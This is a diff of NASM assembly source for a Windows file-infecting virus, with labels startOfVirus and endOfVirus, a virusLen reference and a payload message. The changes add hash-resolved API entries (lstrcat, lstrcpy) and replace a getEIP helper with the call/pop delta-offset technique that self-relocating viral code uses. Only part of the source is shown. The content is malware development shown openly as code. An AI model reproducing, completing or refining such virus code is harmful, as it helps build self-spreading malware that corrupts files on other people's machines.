@@ -37,6 +37,8 @@ struc DATA
     .SetFileTime:             resd 1
     .UnmapViewOfFile:         resd 1
     .WriteFile:               resd 1
+    .lstrcat:                 resd 1
+    .lstrcpy:                 resd 1
 
     ; directory listing data
     .findData:                resb FIND_DATA.size
@@ -82,12 +84,13 @@ section .data
 
 section .text
 _main:
-    mov     ebp, esp                            ; for correct debugging
+    ;mov eax, virusLen   ; REMOVE
     
-startOfVirus:
+startOfVirus:    
 
-    call    getEIP                              ; retrieving current location
+    call    anchor                              ; retrieve current location (valeu of EIP)
 anchor:
+    pop     eax
 
     ; create stack frame for the local variables
     push    ebp                                 ; save old ebp
@@ -687,12 +690,6 @@ OutOfHere:
     retn
 
 
-;; Returns the current value of the EIP register
-getEIP:
-    mov     eax, [esp]
-    retn
-
-
     ;; Constant data section
 
     message:                db 'Good morning America!', 10
@@ -720,6 +717,8 @@ getEIP:
      SetFileTime:             dd 0xae24e4cb
      UnmapViewOfFile:         dd 0x7f75f35b
      WriteFile:               dd 0x2398d9db ; delete
+     lstrcat:                 dd 0x1bf64771
+     lstrcpy:                 dd 0x1bf64947
 
 
     NOPS
@@ -729,3 +728,4 @@ endOfVirus:
 
     push    0
     call    _ExitProcess@4
+
